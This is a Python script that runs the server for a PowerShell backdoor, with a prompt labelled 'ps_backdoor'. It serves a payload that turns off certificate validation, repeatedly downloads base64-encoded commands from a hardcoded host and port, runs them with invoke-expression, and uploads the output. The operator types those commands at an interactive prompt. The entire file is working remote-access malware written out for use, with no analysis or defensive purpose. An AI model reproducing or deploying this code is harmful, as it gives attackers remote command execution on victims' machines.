from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import argparse


code =   """
            function getUser() {{
                $string = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
                $string = $string.Trim()
                return $string
            }}
            function getComputerName() {{
                $string = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
                $string = $string.Trim()
                return $string
            }}
            $resp = "http://{SERVER}:{PORT}/rat"
            $w = New-Object Net.WebClient
	        while($true)
	        {{
	        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
	        $r_get = $w.DownloadString($resp)
            $d = [System.Convert]::FromBase64String($r_get);
            $Ds = [System.Text.Encoding]::UTF8.GetString($d);
	        while($r_get) {{
		        $output = invoke-expression $Ds | out-string
		        $w.UploadString($resp, $output)
		        break
	        }}
	        }}
        """

class myHandler(BaseHTTPRequestHandler):
    
    def log_message(self, fomart , *tes):
        pass

    def do_GET(self):
        if (self.path == "/connect"):
            self.send_response(200)
            self.send_header('Content-type', 1)
            self.end_headers()
            self.wfile.write(code.encode())
        
        elif "/rat" == self.path:
            self.send_response(200)
            cmd = base64.b64encode(input("(ps_backdoor) > ").encode('latin-1'))
            self.send_header('Content-type', 1)
            self.end_headers()
            self.wfile.write(cmd)

    def do_POST(self):
        if "/rat" == self.path:
            content_len = int(self.headers.get('content-length', 0))
            post_read = self.rfile.read(content_len).decode('latin-1')
            print(post_read)
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()

d = dict()
d['SERVER'] = '192.168.174.131'
d['PORT'] = '8000'
code = code.format(**d)


server = HTTPServer(('',8000), myHandler)
print("[*] Aguardando clientes...")
server.serve_forever()